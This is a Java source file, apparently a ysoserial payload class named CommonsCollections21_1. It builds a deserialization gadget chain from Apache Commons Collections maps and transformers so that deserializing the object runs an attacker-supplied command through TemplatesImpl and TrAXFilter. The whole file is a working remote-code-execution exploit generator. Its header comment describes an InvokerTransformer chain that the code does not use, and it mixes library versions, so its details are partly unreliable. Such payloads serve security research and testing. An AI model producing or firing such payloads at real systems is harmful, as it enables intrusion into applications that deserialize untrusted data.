package ysoserial.payloads;


import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.map.ReferenceIdentityMap;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.ReferenceMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.util.*;


/*
	Cluster4_20220605-162453, first chain.
	Gadget chain:

        chain_ReferenceIdentityMap31-readObject-0b8ee023a0a2a936512729024521b4c5ca0c7660.txt
            [
         <org.apache.commons.collections.map.ReferenceIdentityMap: void readObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections.map.AbstractReferenceMap: void doReadObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections.map.AbstractReferenceMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections.CursorableLinkedList: boolean equals(java.lang.Object)>
         <org.apache.commons.collections.FastHashMap: boolean equals(java.lang.Object)>
         <org.apache.commons.collections.map.Flat3Map: boolean equals(java.lang.Object)>
         <org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
         <org.apache.commons.collections.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
         <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
        ]
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({"BadagliaccaDaniele"})
public class CommonsCollections21_1 implements ObjectPayload<ReferenceIdentityMap> {

    public ReferenceIdentityMap getObject(final String command) throws Exception {

        Object templates = Gadgets.createTemplatesImpl(command);

        ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[]{String.class};
        Object[] args = new Object[]{"foo"};
        InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{constant, instantiate});

        // mock method name until armed
        final org.apache.commons.collections4.functors.InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.lazyMap(innerMap1, chain);
        lazyMap1.put("yy", 1);
        System.out.println(lazyMap1.hashCode());

        Map lazyMap2 = LazyMap.lazyMap(innerMap2, chain);
        lazyMap2.put("zZ", 1);
        System.out.println(lazyMap2.hashCode());

        ReferenceIdentityMap referenceIdentityMap = new ReferenceIdentityMap();
        referenceIdentityMap.put(lazyMap1, 1);
        referenceIdentityMap.put(lazyMap2, 2);

        // Needed to ensure hash collision after previous manipulations
        lazyMap1.remove("zZ");

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        System.out.println(lazyMap1.hashCode());
        System.out.println(lazyMap2.hashCode());

        return referenceIdentityMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections21_1.class, args);
    }

}
